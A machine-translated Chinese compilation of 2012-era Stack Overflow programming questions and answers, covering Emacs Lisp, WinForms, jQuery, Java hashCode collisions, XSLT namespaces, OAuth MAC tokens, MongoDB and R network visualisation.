我不知道一个简单的方法来做到这一点。我会使用`(window-tree (selected-frame))`, 并解析返回值以找到水平布局的最大窗口数的行，并使用计数来计算帧宽度并希望窗口能够正确缩放。如果窗口不能正确缩放，那么我会尝试`window-resize`使用`window.el`.

的返回值格式`window-tree`可以在[Emacs Lisp 文档](http://www.gnu.org/software/emacs/manual/html_node/elisp/Window-Tree.html)中找到。

类似于以下功能的东西应该可以解决问题：

```
(defun horizontal-window-count (tree) 
  (if (atom tree)
      1
    (if (car tree)
        (apply 'max (mapcar 'horizontal-window-count (cddr tree)))
      (apply '+ (mapcar 'horizontal-window-count (cddr tree)))))) 
```

你用它作为`(horizontal-window-count (car (window-tree)))`. 代码可能可以简化，它可能有一些问题，但我对 lisp 也不是很流利。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T16:25:04.177

这会将帧大小设置为窗口数 * 120，但“水平窗口数”的含义需要更大的定义。

```
(set-frame-width (selected-frame) (* 120 (length (window-list)))) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T06:42:13.830

当前的解决方案是其所有丑陋的荣耀。

```
(defun horizontal-window-count (tree) 
  (if (atom tree)
      1
    (if (car tree)
        (apply 'max (mapcar 'horizontal-window-count (cddr tree)))
      (apply '+ (mapcar 'horizontal-window-count (cddr tree))))))
(defun horz-count ()
  (horizontal-window-count (car (window-tree))))
(defun standard-width ()
  "makes the widht of the window 120, our coding standard"
  (interactive)
  (set-frame-width (selected-frame) (* 120 (horz-count)))
  ) 
```

# c# - 透明标签倒计时闪烁

> ID：10102316
> 
> 赞同：0
> 
> 时间：2012-04-11T08:20:28.387
> 
> 标签：c#, winforms, label, transparent

我正在尝试做一个具有透明度的自定义标签类，并且我正在搜索很多关于此的文章，但我的情况不同，因为我正在尝试使用透明标签进行倒计时，然后当我使用下面的示例代码时成功闪烁。我使用间隔设置为 100 的计时器，然后更改文本自定义标签。我不知道刷新时我能做些什么来获得更好的性能，知道吗？

```
class CustomLabel : Label
{
    public CustomLabel()
    {
        this.SetStyle(ControlStyles.Opaque, true);
        this.SetStyle(ControlStyles.OptimizedDoubleBuffer, false);
    }

    protected override System.Windows.Forms.CreateParams CreateParams
    {
        get
        {
            CreateParams cp = base.CreateParams;
            cp.ExStyle |= 0x20;
            return cp;
        }
    }
    public override string Text
    {
        get
        {
            return base.Text;
        }
        set
        {
            base.Text = value;
            RecreateHandle();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T11:16:44.167

由于 RecreateHandle() 调用，它会闪烁。这重新创建了本机 Windows 窗口，当您看到旧窗口被破坏并创建新窗口时，闪烁是不可避免的。只需删除呼叫，没有必要。

并且不要忘记利用Label 控件中对透明度的[内置支持。](https://stackoverflow.com/questions/9387267/transparent-background-label-over-picturebox/9387562#9387562)

# javascript - 浏览器扩展检测安装

> ID：10102322
> 
> 赞同：0
> 
> 时间：2012-04-11T08:20:48.017
> 
> 标签：javascript, google-chrome-extension, firefox-addon, xul

我在 Firefox 中有一个扩展程序，在 Chrome 中有一个扩展程序。我想在安装或卸载扩展程序时调用 javascript 函数。在任何这些浏览器中都可以吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:16:33.173

## 火狐

*   此答案已涵盖检测安装：[Firefox extension opens a page on install](https://stackoverflow.com/questions/958893/firefox-extension-opening-a-page-on-install)
*   [监听加载项卸载的示例代码](https://developer.mozilla.org/en/Addons/Add-on_Manager/Code_Samples#Listening_for_add-on_uninstall)（使用[`AddonManager`](https://developer.mozilla.org/en/Addons/Add-on_Manager/AddonManager)API）

## 谷歌浏览器

在 Chrome 中，没有内置的方法来检测安装或卸载。

*   可以检查[背景页面](http://code.google.com/chrome/extensions/background_pages.html)`localStorage`上的标志是否存在，并对其采取行动。

    ```
    if (!localStorage.getItem('my-extension-first-time')) {
        // Do something
        alert('Hello first timer!');
        // Set flag
        localStorage.setItem('my-extension-first-time', true);
    } 
    ```

*   没有办法监听自身的卸载。
*   API可[`chrome.management`](http://code.google.com/chrome/extensions/management.html)用于[监控](http://code.google.com/chrome/extensions/management.html#global-events)外部扩展（卸载）安装。

# javascript - 突出显示简单的数字行？

> ID：10102326
> 
> 赞同：3
> 
> 时间：2012-04-11T08:21:13.230
> 
> 标签：javascript, jquery, highlight

我有一个 javascript 循环并想突出显示一些数字

```
for(i=0;i<=100;i++){
  $("#mydiv").append("<span>"+i+"</span>");
} 
```

现在我想每 4 次选择 1、5、9、13、17...，但从 1 开始并突出显示它。每一秒都很容易：

```
for(i=0;i<=100;i++){
  var bool = false;
  if(bool){
    $("#mydiv").append("<span>"+i+"</span>");
    bool = false;
  } else {
    $("#mydiv").append("<span class='highlight'>"+i+"</span>");
    bool = true;
  }
} 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:28:16.813

我很惊讶人们推荐 jQuery 的 nth-child 选择器，而不仅仅是通过 CSS 直接设置 nth-child 样式。

在您的样式表中：

```
#mydiv span:nth-child(4n-2) { background-color: yellow } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T08:27:25.443

您可以使用第 n 个子选择器来完成此操作。看到这个 js 小提琴：

[http://jsfiddle.net/pJZkL/](http://jsfiddle.net/pJZkL/)

```
$(function(){
    var ap = "";
    for(i=0;i<=100;i++){
        ap+="<span class='nr'>"+i+", </span>";
    }
    $("p").append(ap);
}); 
```

其逻辑现在在 CSS 中：

```
.nr{
    color: blue;
}
.nr:nth-child(4n-2){
    color: red;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T08:23:34.490

看看这个： [http ://api.jquery.com/nth-child-selector/](http://api.jquery.com/nth-child-selector/)

[例子](http://jsfiddle.net/muu2E/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T08:24:05.133

```
for(i=0;i<=100;i++){
  if(i%4==1){
    $("#mydiv").append("<span class="highlight">"+i+"</span>");
  } else {
    $("#mydiv").append("<span>"+i+"</span>");
  }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-11T08:25:41.357

您应该使用第[n 个子](http://api.jquery.com/nth-child-selector/)选择器

```
$('#mydiv span:nth-child(4n+1)').addClass('highlight'); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-11T08:29:03.707

我不确定我是否正确地回答了你的问题。据我了解，以下循环应该对您有所帮助。

```
var inc = 1;
for(i=0;i<=100;i++){
  if(i !== inc ){
    $("#mydiv").append("<span>"+i+"</span>");
  } else {
    $("#mydiv").append("<span class="highlight">"+i+"</span>");
    inc += 4;
  }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-11T08:59:37.160

```
 var pre = 0;
 for(i=0;i<=100;i++){
   if(i === 1 || (i-4) === pre ){
      $("#mydiv").append("<span class="highlight">"+i+"</span>");
      pre = i;
   } else {
      $("#mydiv").append("<span>"+i+"</span>");
   }
 } 
```

这应该这样做。虽然我没有测试过..干杯

# android - Xoom avd - API 11 附上谷歌地图

> ID：10102332
> 
> 赞同：1
> 
> 时间：2012-04-11T08:21:30.063
> 
> 标签：android

我已经下载了用于摩托罗拉平板电脑开发的 avd“ **Xoom (Motorola Mobility Holding INC) - Api Level 11** ”，并配置和集成了谷歌地图，但“ **MapActivity** ”类需要谷歌 API 类。所以我复制*了 map.jar*文件并将其添加为外部库但未运行。我知道有 google API 可用于执行地图操作，但我需要继续使用“ **Xoom (Motorola Mobility Holding INC) - Api Level 11** ”***不***谷歌 API 那么有什么替代方式可以让我将谷歌地图集成到这个级别。

# java - Java 的 hashCode 可以为不同的字符串产生相同的值吗？

> ID：10102337
> 
> 赞同：47
> 
> 时间：2012-04-11T08:22:00.827
> 
> 标签：java, hashcode

是否可以使用 java 的 hashcode 函数为不同的字符串使用相同的 hashcode？或者如果有可能，那么它的可能性是多少？

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-04-11T08:26:13.773

Java 哈希码是 32 位。它散列的可能字符串的数量是无限的。

所以是的，会有碰撞。百分比是没有意义的——有无限数量的项目（字符串）和有限数量的可能散列。

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2012-04-11T08:26:09.180

是的。很多。

看看下面的一对

*   “FB”和“Ea”

即使其中的字符不同，也可以返回相同的哈希码。

基本上它是字符串中字符的总和乘以一个整数。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-11T08:41:03.177

> 如果有可能，那么其​​可能性的百分比是多少？

这不是一个特别有意义的问题。

但是，除非`String::hashcode`函数或生成对象的方式存在系统性偏差，否则`String`任何两个不同（不相等）`String`对象具有相同哈希码的概率将为 2 ^(32)中的 1 。

这假设字符串是从所有可能的字符串值的集合中随机选择的。如果您以各种方式限制集合，则概率将与上述数字不同。（例如，“FB”/“Ea”冲突的存在意味着所有 2 个字母字符串的集合中发生冲突的概率高于规范。）

* * *

另一件需要注意的事情是，随机选择 2 ^(32 个)不同的字符串（来自更大的无偏字符串集）没有哈希冲突的机会*非常*小。[要了解原因，请阅读关于生日悖论](http://en.wikipedia.org/wiki/Birthday_problem)的维基百科页面。

实际上，在一组 2 ^(32 个)不同的字符串中没有哈希冲突的唯一方法是选择或生成字符串。即使通过选择随机生成的字符串来形成集合，计算量也会很大。为了有效地生成这样的集合，您需要利用`String::hashCode`算法的属性，（幸运的是）已指定。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2014-06-19T11:47:30.910

是的，这是完全可能的。字符串（或其他对象类型——假设您将在本例中使用字符串）与集合中的其他字符串具有相同哈希码的概率取决于该集合的大小（假设所有字符串在该系列是独一无二的）。概率分布如下：

*   对于一组大小约为 9,000 的集合，您将有 1% 的机会使两个字符串与集合中的哈希发生冲突
*   对于大小约为 30,000 的集合，您将有 10% 的机会使两个字符串与集合中的哈希发生冲突
*   对于一组大小约为 77,000 的集合，您将有 50% 的机会使两个字符串与集合中的哈希发生冲突

所做的假设是：

*   hashCode 函数没有偏差
*   上述集合中的每个字符串都是唯一的

这个网站解释得很清楚：[http](http://eclipsesource.com/blogs/2012/09/04/the-3-things-you-should-know-about-hashcode/) ://eclipsesource.com/blogs/2012/09/04/the-3-things-you-should-know-about-hashcode/ （看“你应该知道的第二件事”）

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-04-11T08:25:31.773

这不会直接回答您的问题，但我希望它有所帮助。

以下来自`java.lang.String`.

```
/**
 * Returns a hash code for this string. The hash code for a
 * <code>String</code> object is computed as
 * <blockquote><pre>
 * s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1]
 * </pre></blockquote>
 * using <code>int</code> arithmetic, where <code>s[i]</code> is the
 * <i>i</i>th character of the string, <code>n</code> is the length of
 * the string, and <code>^</code> indicates exponentiation.
 * (The hash value of the empty string is zero.)
 *
 * @return  a hash code value for this object.
 */
public int hashCode() {
    int h = hash;
    int len = count;
    if (h == 0 && len > 0) {
    int off = offset;
    char val[] = value;

        for (int i = 0; i < len; i++) {
            h = 31*h + val[off++];
        }
        hash = h;
    }
    return h;
} 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-04-11T08:30:21.773

是的，两个字符串可能具有相同的哈希码 - 如果您查看[Wikipedia 文章](http://en.wikipedia.org/wiki/Java_hashCode%28%29#The_java.lang.String_hash_function)，您会看到两者都`"FB"`具有`"Ea"`相同的哈希码。方法契约中没有任何内容说 a`hashCode()`应该用于比较相等性，您想使用`equals()`它。

从 Java 1.2 开始，String`hashCode()`通过[对字符串的整个文本使用积和算法来实现](http://www.cogs.susx.ac.uk/courses/dats/notes/html/node114.html)。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2012-04-11T08:25:40.540

是的，根据鸽子洞概念的定义，两个不同的字符串可以产生相同的哈希码，并且应该始终编写代码以适应这种情况（通常是不中断。）

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2012-04-11T11:28:20.503

*随机*字符串的冲突百分比应该是最小的。但是，如果您从外部来源散列字符串，攻击者可以轻松创建数十万个具有相同散列码的字符串。在 java HashMap 中，这些都将映射到同一个存储桶并有效地将映射转换为链表。然后，对地图的访问时间将与地图大小成正比，而不是常数，从而导致拒绝服务攻击。

请参阅此页面关于[针对 Web 应用程序平台的有效 DoS 攻击，](http://cryptanalysis.eu/blog/2011/12/28/effective-dos-attacks-against-web-application-plattforms-hashdos/)以获取指向演示文稿的更多信息链接。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2018-06-01T09:19:25.357

是的，这是可能的，因为 Object 类的 equals() 和 hashCode() 方法之间的约定之一是………… ***如果两个对象根据 equals() 方法不相等，则没有保证他们的 hashCode 将相同，hashCode 可能/可能不相等。即，如果 obj1.equals(obj2) 返回 false，则 obj1.hashCode()==obj2.hashCode() 可能/可能不会返回 true。*** 例子：

```
 String str1 = "FB";
    String str2 = "Ea";
    System.out.println(str1.equals(str2));// false
    System.out.println(str1.hashCode() == str2.hashCode()); // true 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-12-20T23:09:17.763

//你可以用-Xmx2100m运行下面的代码，可以得到多个结果，足以填满你的控制台

`

```
import java.util.HashMap;

public class TestHashCollision {
        public static void main(String[] args) {
        final String TEXT = "was stored earlier had the same hash as";
        HashMap<Integer,String> hs=new HashMap<>();
        long t1=System.currentTimeMillis();
        long t2=System.currentTimeMillis();
        for(long l=0;l<Long.MAX_VALUE;l++) {
            String key="d"+l;
            if(hs.containsKey(key.hashCode())) {
                System.out.println("'"+hs.get(key.hashCode())+"' "+TEXT+" '"+key+"'");//System.exit(0);
            } else {
                hs.put(key.hashCode(),key);
            }
            t2=System.currentTimeMillis();
            if(t2-t1>10000) {
                t1=System.currentTimeMillis();
                System.out.println("10 seconds gone! size is:"+hs.size());
            }
        }
        System.out.println("Done"); 
    }
} 
```

`

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2019-01-14T19:58:32.043

是的（不仅在 Java 中，它适用于任何语言），它可以为不同的字符串生成相同的哈希码。我在回忆我的教授教过的一条规则，它在这里可能有用-

> 两个相同的字符串/值必须具有相同的哈希码，但反之则不然。

python中的示例

```
>>> hash('same-string')
-5833666992484370527
>>> hash('same-string')
-5833666992484370527 
```

可能有另一个字符串可以匹配相同的哈希码，因此我们无法使用哈希码派生密钥。

> 两个不同字符串具有相同哈希码的原因是由于冲突。 [![在此处输入图像描述](../Images/fb32488eb98e0533b9123cf6a4e53d90.png)](https://i.stack.imgur.com/GEuOa.png)

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2020-10-12T17:45:55.200

```
"tensada".hashCode()
"friabili".hashCode()); 
```

java 哈希函数在这里返回相等的值。

# google-chrome - 谷歌网页字体未显示在 chrome 浏览器上

> ID：10102339
> 
> 赞同：0
> 
> 时间：2012-04-11T08:22:01.737
> 
> 标签：google-chrome, google-webfonts

我使用谷歌应用引擎创建了一个简单的网络应用程序/表单。网站在这里； [madhurdishti.appspot.com](http://madhurdrishti.appspot.com)

我正在使用谷歌网络字体中的一些字体。

参考是；

```
<link href='http://fonts.googleapis.com/css?family=Lobster+Two:700italic' rel='stylesheet' type='text/css'> 
```

CSS是；

```
h3 {font-family: 'Lobster Two', cursive;
    text-shadow: -1px 1px 0px #fff;
    font-size:1.4rem;
    line-height: 2;} 
```

字体在 IE 和 FF 中正确显示，但在 chrome 中不正确。您可以在 FF 和 chrome 中打开相同的文件，如果您同时拥有两者并查看差异。

任何人都知道出了什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:34:25.703

您需要像这样更改 H3 标题：

```
h3 {
    font-family: 'Lobster Two', cursive;
    text-shadow: -1px 1px 0px #fff;
    font-size:1.4rem;
    line-height: 2;
    font-style: italic;

} 
```

我刚刚添加`font-style: italic;`，因为您要导入字体的斜体版本

# python - 在线程中传播系统调用中断

> ID：10102340
> 
> 赞同：0
> 
> 时间：2012-04-11T08:22:05.040
> 
> 标签：python, multithreading, system-calls, interrupted-exception

我正在运行两个 python 线程（`import threading`）。他们俩都在`open()`通话中被阻止；事实上，他们试图打开命名管道以写入它们，因此在有人尝试从命名管道读取之前阻塞是一种正常的行为。

简而言之，它看起来像：

```
import threading

def f():
    open('pipe2', 'r')

if __name__ == '__main__':
    t = threading.Thread(target=f)
    t.start()
    open('pipe1', 'r') 
```

当我键入 ^C 时，`open()`主线程中的 被中断（引发`IOError`errno == 4）。

我的问题是：`t`线程仍在等待，我想传播中断行为，以使其也提高`IOError`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:03:31.253

我在 python 文档中找到了这一点：
“ ...只有主线程可以设置新的信号处理程序，并且主线程将是唯一接收信号的线程（这是由 Python 信号模块强制执行的，即使底层线程实现支持向单个线程发送信号）。这意味着信号不能用作线程间通信的手段。请改用锁。“
也许您还应该查看这些文档：
[exceptions.KeyboardInterrupt](http://docs.python.org/release/2.6.7/library/exceptions.html#exceptions.KeyboardInterrupt)

[库/signal.html](http://docs.python.org/release/2.6.7/library/signal.html)

另一种想法是使用 select 在线程中异步读取管道。这适用于 Linux，不确定 Windows（它不是​​最干净的，也不是最好的实现）：

```
 #!/usr/bin/python

   import threading
   import os
   import select

   def f():
           f = os.fdopen(os.open('pipe2', os.O_RDONLY|os.O_NONBLOCK))
           finput = [ f ]
           foutput = []
           # here the pipe is scanned and whatever gets in will be printed out
           # ...as long as 'getout' is False
           while finput and not getout:
                   fread, fwrite, fexcep = select.select(finput, foutput, finput)
                   for q in fread:
                           if q in finput:
                                   s = q.read()
                                   if len(s) > 0:
                                           print s

   if __name__ == '__main__':
           getout = False
           t = threading.Thread(target=f)
           t.start()
           try:
                   open('pipe1', 'r')
           except:
                   getout = True 
```

# iphone - 如何将按下的 UIView 标记传递给方法选择器？

> ID：10102343
> 
> 赞同：0
> 
> 时间：2012-04-11T08:22:28.290
> 
> 标签：iphone, uiview, selector, uigesturerecognizer

我有 11 个 UIView，每个都设置了一个手势识别器。这个 UIView 在可变数组中，每个都有一个标签。如何将按下的 UIView 标记传递给方法选择器？

```
viewIcone.userInteractionEnabled = YES;
viewIcone.tag = index;    

UITapGestureRecognizer * tap = [[UITapGestureRecognizer alloc]initWithTarget:self    action:@selector(touchUp:)];
tap.delegate = self;
[viewIcone addGestureRecognizer:tap];
[self.arrayMutabile insertObject:viewIcone atIndex:index];

[self addSubview:viewIcone]; 
```

方法选择器的实现是：

```
-(void) touchUp: (UITapGestureRecognizer *) gestureRecognizer{

   NSInteger tag = [self.arrayMutabile indexOfObject:self.viewIcone];
   NSLog(@"the tag is %d", tag);
} 
```

我总是离开10。哪里错了？提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:29:31.757

UITapGestureRecognizer 有一个从其父级继承的视图属性：

[http://developer.apple.com/library/ios/#documentation/uikit/reference/UIGestureRecognizer_Class/Reference/Reference.html#//apple_ref/occ/cl/UIGestureRecognizer](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIGestureRecognizer_Class/Reference/Reference.html#//apple_ref/occ/cl/UIGestureRecognizer "UIGestureRecognizer 类参考")

```
The view the gesture recognizer is attached to. (read-only)

@property(nonatomic, readonly) UIView *view
Discussion
You attach (or add) a gesture recognizer to a UIView object using the addGestureRecognizer: method.

Availability
Available in iOS 3.2 and later.
Declared In
UIGestureRecognizer.h 
```

这将是被点击的视图，您可以从那里检索标签。

# android - 授权请求标头 OAuth 2.0

> ID：10102346
> 
> 赞同：1
> 
> 时间：2012-04-11T08:22:35.727
> 
> 标签：android, oauth, oauth-2.0

我正在尝试在我正在从事的项目中实施 OAuth 2.0。我能够使用身份验证服务器进行身份验证，但是我遇到了资源服务器的问题。我们正在使用 MAC 令牌（[规范](http://tools.ietf.org/pdf/draft-ietf-oauth-v2-http-mac-00.pdf)）。您可以在规范的 3.1 中看到我需要发送一个 Authorization 请求标头，其中包括以下内容。我对此毫无意义。有人可以告诉我我应该在这里做什么吗？

```
credentials = "MAC" [ RWS 1#param ]
param = id /
nonce /
body-hash /
ext /
mac
id = "id" "=" <"> plain-string <">
nonce = "nonce" "=" <"> 1*DIGIT ":" plain-string <">
body-hash = "bodyhash" "=" <"> plain-string <">
ext = "ext" "=" <"> plain-string <">
mac = "mac" "=" <"> plain-string <">
plain-string = 1*( %x20-21 / %x23-5B / %x5D-7E ) 
```

## 更新

我觉得我到了某个地方，但我觉得我离解决这个问题还很远。

所以我正在构建类似下面的东西

```
StringBuilder header = new StringBuilder("MAC ").append("id=\"").append(sharedPrefs.getString(Constants.ACCESS_TOKEN, "error")).append("\",nonce=\"").append(createNonce()).
                append("\",bodyhash=\"").append(bodyHash).append("\",mac=\"").append(mac).append("\""); 
```

我像这样计算身体哈希

```
public static String SHA256(String text) throws  UnsupportedEncodingException  { 
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("SHA-256");
        } catch (NoSuchAlgorithmException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        byte[] shahash = new byte[40];
        md.update(text.getBytes("iso-8859-1"), 0, text.length());
        shahash = md.digest();
        return Base64.encodeToString(shahash, Base64.DEFAULT);
} 
```

还有这样的mac

```
private String hmacSHA256(String data) throws Exception {
    String key = sharedPrefs.getString(Constants.SECRET, "error");
    SecretKeySpec secretKey = new SecretKeySpec(key.getBytes("UTF-8"), "HmacSHA256");
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(secretKey);
    byte[] hmacData = mac.doFinal(data.getBytes("UTF-8"));
    //Log.i(TAG, "BYTE ARRAY TO STRING: " + Base64.encodeToString(hmacData, Base64.DEFAULT));
    String value = Base64.encodeToString(hmacData, Base64.DEFAULT);
    return value;
} 
```

我遇到了问题，因为服务器没有响应。这真的让我发疯，我无法想象这个文档对任何人来说都是清楚的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T13:42:44.717

需要注意的是，*[MAC 访问认证方案](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-http-mac)*是 oauth2 协议的**扩展**，类似于*HTTP 基本访问*，但是是可选的，所以不需要在每个资源服务器中都实现。

因此，如果您发出*未经身份验证的请求*并且*资源服务器*响应如下：

```
HTTP/1.1 401 Unauthorized 
WWW-Authenticate: MAC 
```

,`MAC`表示您*可以使用此*身份验证方案。

目前为基于 oauth2 的资源服务器实现的最常见的身份验证方案是：[承载](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-bearer)。

* * *

如果你仍然对如何实现这个规范有疑虑，Github 上有一个很好[的 Android 资源来完成它。](https://github.com/Xotan/OAuth2Android)您需要的 java 类可能就是[这个](https://github.com/Xotan/OAuth2Android/blob/master/src/org/gerstner/oauth2android/token/MacTokenTypeDefinition.java)。

玩得开心！

# xslt - 使用 XSLT 1.0 的元素上的多个命名空间

> ID：10102348
> 
> 赞同：3
> 
> 时间：2012-04-11T08:22:40.990
> 
> 标签：xslt, namespaces

我正在使用 Microsoft 的 XSLT 处理器（仅限 1.0）

XML 开场白：

```
<?xml version="1.0" encoding="utf-8"?>
<Header xmlns="http:\\OldNameSpace.com">
    <Detail> 
```

使用以下 XSLT 模板来获取`<Header>`我的文档的元素并更改其名称空间。

```
<xsl:template match="*">
    <xsl:element name="{name()}" xmlns="http:\\NewNameSpace.com"> 
        <xsl:copy-of select="@*"/>
        <xsl:apply-templates />
    </xsl:element>
</xsl:template> 
```

变成`<Header xmlns="http:\\OldNameSpace.com">`_`<Header xmlns="http:\\NewNameSpace.com">`

但是，我现在需要为此添加第二个命名空间，以便获得以下输出：

```
<Header xmlns="NewNameSpace.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> 
```

我试过使用：

```
<xsl:template match="*">
    <xsl:element name="{name()}" xmlns="NewNameSpace.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> 
        <xsl:copy-of select="@*"/>
        <xsl:apply-templates />
    </xsl:element>
</xsl:template> 
```

但是，我仍然只能得到与原始 XSLT 模板相同的输出。

谁能告诉我这是为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T12:14:26.890

**这种转变**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:old="http:\\OldNameSpace.com"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  exclude-result-prefixes="old xsi">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:param name="pNewNamespace" select="'http:\\NewNameSpace.com'"/>

 <xsl:variable name="vXsi" select="document('')/*/namespace::*[name()='xsi']"/>

 <xsl:template match="node()|@*">
     <xsl:copy>
       <xsl:apply-templates select="node()|@*"/>
     </xsl:copy>
 </xsl:template>

    <xsl:template match="old:*">
        <xsl:element name="{local-name()}" namespace="{$pNewNamespace}">
          <xsl:copy-of select="$vXsi"/>
            <xsl:copy-of select="@*"/>
            <xsl:apply-templates />
        </xsl:element>
    </xsl:template>
</xsl:stylesheet> 
```

**当应用于以下 XML 文档时**：

```
<Header xmlns="http:\\OldNameSpace.com">
    <Detail/>
</Header> 
```

**产生（我猜是）想要的正确结果**：

```
<Header xmlns="http:\\NewNameSpace.com"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <Detail/>
</Header> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:59:07.750

xsl:element（与文字结果元素不同）不会*将*所有范围内的名称空间复制到结果中，而只是将元素名称所需的名称空间 9 隐含地从其名称中或使用名称空间参数指定）。

xslt2 为这种情况添加了一个 xsl:namespace 指令，但在 xslt1 中最简单的做法是

在哪里

```
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
```

在祖先的某个地方（例如在 xsl:stylesheet 上。）

这将在输出中添加虚假信息`xsi:tmp=""`，但也会添加名称空间声明，如果您实际上需要此名称空间中的属性，例如`xsi:type`在上面使用它而不是 tmp ，您就完成了。如果您不介意 xsi 命名空间中额外的、可能无效的属性，那么您就完成了。否则在变量中执行上述操作，然后用于`msxsl:node-set`查询变量并删除虚假的额外属性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T11:37:44.473

如果您静态地知道要生成什么名称空间，那么在 XSLT 1.0 中执行此操作的最简单方法是使用 xsl:copy-of。创建一个源文件`<dummy xmlns:xsi="http://whatever"/>`，然后`<xsl:copy-of select="document('dummy.xml')/*/namespace::xsi"/>`在你的调用里面做`xsl:element`。

# python - Map Reduce 时间戳

> ID：10102349
> 
> 赞同：2
> 
> 时间：2012-04-11T08:23:00.563
> 
> 标签：python, mongodb

MongoDB数据库：

```
{"thread": "abc", "message": "hjhjh", "Date": (2010,4,5,0,0,0)}
{"thread": "abc", "message": "hjhjh",  "Date": (2009,3,5,0,0,0)}
{"thread": "efg", "message": "hjhjh",  "Date": (2010,3,7,0,0,0)}
{"thread": "efg", "message": "hjhjh",  "Date": (2011,4,5,0,0,0)} 
```

如何对上述数据进行 Map-Reduce 或聚合以生成输出：

```
{"thread": "abc", "messages_per_month": 5}
{"thread": "efg", "messages_per_month": 4} 
```

我正在尝试编写一些代码，但很难在未排序的日期上取平均值。是否有任何内置函数可以按时平均执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:35:35.987

[您可以在此处](http://cookbook.mongodb.org/patterns/finding_max_and_min/)为数字描述的日期上执行最小/最大值，只需为消息添加一个计数器。结果将是包含消息数量和最小/最大日期的线程列表。根据日期，您可以计算月数，然后您可以使用该月数来平均消息数量。

# r - 使用 R 和 Cytoscape 进行大规模社交网络可视化的记忆问题

> ID：10102350
> 
> 赞同：2
> 
> 时间：2012-04-11T08:23:07.473
> 
> 标签：r, social-networking, social, large-scale, cytoscape

我对 R 比较陌生，正在尝试解决以下问题：

我在带有 32 位版本 R 的 Windows 7 Enterprise 平台上工作，并且我的机器上有大约 3GB 的 RAM。我有大规模的社交网络数据（大约 7,000 个顶点和大约 30,000 个边），这些数据当前存储在我的 SQL 数据库中。我设法将这些数据（省略顶点和边缘属性）拉入 R 数据框，然后拉入 igraph 对象。为了进一步分析和可视化，我现在想使用 RCytoscape 将此 igraph 推送到 Cytoscape 中。目前，我的方法是将 igraph 对象转换为 graphNEL 对象，因为 RCytoscape 似乎适用于这种对象类型。（igraph 绘图功能太慢，缺乏进一步的分析功能。）

不幸的是，我在运行这个脚本时总是遇到内存问题。不过，它以前曾与较小的网络合作过。

有谁知道如何解决这个问题？或者你能推荐任何其他与 R 配合得很好并且可以处理如此大规模数据的可视化和分析工具吗？

任何帮助将非常感激。提前非常感谢！

最好的，伊格纳西奥

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-17T22:58:58.577

很抱歉花了几天时间回复您。

我刚刚进行了一些测试

1）在 R 中创建邻接矩阵 2）然后从矩阵创建 R graphNEL 3）（可选）添加节点和边缘属性 4）创建、显示、布局和重绘 CytoscapeWindow

```
(all times are in seconds)

nodes   edges  attributes? matrix    graph   cw    display   layout  redraw   total
  70      35       no       0.001    0.001   0.5      5.7      2.5    0.016    9.4
  70       0       no       0.033    0.001   0.2      4.2      0.5    0.49     5.6
 700     350       no       0.198    0.036   6.0      8.3      1.6    0.037   16.7
1000     500       no       0.64     0.07   12.0      9.8      1.8    0.09    24.9
1000     500      yes       0.42    30.99   15.7     29.9      1.7    0.08    79.4
2000    1000       no       3.5      0.30   73.5     14.9      4.8    0.08    96.6
2500    1250       no       2.7      0.45  127.1     18.3     11.5    0.09   160.7
3000    1500       no       4.2      0.46  236.8     19.6     10.7    0.10   272.8
4000    2000       no       8.4      0.98  502.2     27.9     21.4    0.14   561.8 
```

